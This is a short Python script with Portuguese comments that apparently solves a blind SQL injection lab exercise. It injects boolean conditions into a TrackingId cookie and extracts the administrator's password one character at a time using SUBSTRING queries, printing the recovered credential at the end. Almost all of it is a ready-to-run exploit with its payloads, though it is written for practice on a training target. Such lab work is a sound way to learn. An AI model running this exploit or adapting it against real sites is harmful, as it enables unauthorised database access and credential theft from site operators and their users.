import requests, urllib3, sys
urllib3.disable_warnings()

# PEGA URL
URL = ""
TRACKING = ""
SESSION = ""

def testa(payload_extra):
    cookies = {"TrackingId": TRACKING + payload_extra, "session": SESSION}
    try:
        r = requests.get(URL, cookies=cookies, verify=False, timeout=10)
        return "Welcome back" in r.text
    except Exception as e:
        print(f"[!] Erro de conexão: {e}")
        return False

print("[*] Testando se o lab tá vivo...")
if not testa("' AND '1'='1'-- "):
    print("[-] LAB MORTO. Pega TrackingId e session novos. Vai no DevTools > Application > Cookies")
    sys.exit()
if testa("' AND '1'='2'-- "):
    print("[-] Lógica invertida, algo errado no payload base")
    sys.exit()

print("[+] Lab vivo. Iniciando extração...")

senha = ""
for pos in range(1, 21):
    achou = False
    for c in "abcdefghijklmnopqrstuvwxyz0123456789":
        # Payload mais estável: SUBSTRING ao invés de LIKE
        payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{c}'-- "
        if testa(payload):
            senha += c
            print(f"[+] pos {pos}: {senha}")
            achou = True
            break
    if not achou:
        print(f"[!] Parou na pos {pos}, senha até agora: {senha}")
        break

print(f"\n[FINAL] administrator:{senha}")
